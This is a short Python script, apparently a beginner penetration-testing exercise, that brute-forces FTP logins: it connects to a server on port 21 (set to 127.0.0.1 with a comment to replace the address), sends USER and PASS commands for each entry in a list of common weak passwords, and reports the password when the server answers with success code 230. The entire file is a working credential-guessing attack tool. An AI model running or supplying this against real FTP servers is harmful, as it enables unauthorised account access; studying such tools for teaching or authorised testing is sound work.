#!/usr/bin/python

import socket

def connect(username, password):
    try:
        sample = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sample.connect(('127.0.0.1', 21))  # Replace with the correct IP address and port
        sample.recv(1024)  # Receive the initial response
        
        sample.send(f'USER {username}\r\n'.encode())
        sample.recv(1024)  # Receive the response
        
        sample.send(f'PASS {password}\r\n'.encode())
        response = sample.recv(1024).decode()  # Receive the response
        
        sample.send(b'QUIT\r\n')
        sample.close()
        
        return response
    except Exception as e:
        print(f"Error: {e}")
        return None

username = ""
passwords = ["123", "ftp", "root", "admin", "test", "backup", "password"]

for password in passwords:
    print(f"[*] Checking {username}:{password}")
    response = connect(username, password)
    
    if response and "230" in response:
        print(f"[*] Password found: {password}")
        break